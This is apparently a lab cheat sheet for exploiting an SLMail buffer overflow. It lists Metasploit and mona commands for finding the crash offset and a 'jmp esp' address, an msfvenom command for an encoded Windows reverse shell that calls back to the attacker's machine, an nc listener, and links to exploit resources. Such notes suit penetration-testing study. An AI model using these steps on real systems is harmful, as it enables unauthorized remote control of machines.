Commands 

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438

/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm > jmp esp

!mona modules

!mona find -s "\xff\xe4" -m slmfc.dll

msfvenom -p windows/shell_reverse_tcp LHOST=(KALI IP) LPORT=443 -f py -b '\x00\x0a\x0d\' -e x86/shikata_ga_nai

nc -nlvp 443



URLs:

https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

https://www.exploit-db.com/exploits/638/

https://www.immunityinc.com/products/debugger/

https://github.com/corelan/mona

https://github.com/jessekurrus/slmailsploits
